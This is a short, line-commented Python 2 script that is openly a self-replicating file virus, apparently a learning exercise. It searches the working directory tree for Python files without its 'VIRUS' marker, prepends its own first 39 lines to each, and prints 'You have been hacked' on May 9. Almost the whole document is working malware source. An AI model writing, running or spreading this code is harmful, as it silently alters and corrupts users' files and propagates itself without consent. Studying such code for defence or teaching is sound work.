#!/usr/bin/python
import os # imports underlying os module to run os dependent commands
import datetime

SIGNATURE = "VIRUS" # set signature equal to virus normal variable

def locate(path): # defined locate as a function acting on path
    files_targeted = [] # list with nothing
    filelist = os.listdir(path) # getting all the files and dirs 
    for fname in filelist: # doing x to fname in the filelist
        if os.path.isdir(path+"/"+fname): #looking for existing dir
            files_targeted.extend(locate(path+"/"+fname)) #gets list and adds to it
        elif fname[-3:] == ".py": #checking if its a python script
            infected = False # sets a variable
            for line in open(path+"/"+fname): # looks through file
                if SIGNATURE in line: # looking for virus
                    infected = True  #sets a variable
                    break #ends 
            if infected == False: #if its not true this runs
                files_targeted.append(path+"/"+fname) # append the files
    return files_targeted #return the files

def infect(files_targeted): #defined a new function
    virus = open(os.path.abspath(__file__)) #execute file
    virusstring = "" #another variable thats empty
    for i,line in enumerate(virus): #checks through the lines
        if 0 <= i < 39: # < or = to 0 but < 39
            virusstring += line #adds to the line
    virus.close # ends 
    for fname in files_targeted: #targets fname
        f = open(fname) # sets opened fname as f
        temp = f.read() # makes f temp file
        f.close() #closes f
        f = open(fname,"w") #opens with wright
        f.write(virusstring + temp) # writes virus to temp 
        f.close() # closes file

def detonate(): # defined function detonate
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9: #runs if its may 9th
        print "You have been hacked" # they got you

files_targeted = locate(os.path.abspath("")) #targets the working directory
infect(files_targeted) #infects files
detonate() # uses the detonate funcion
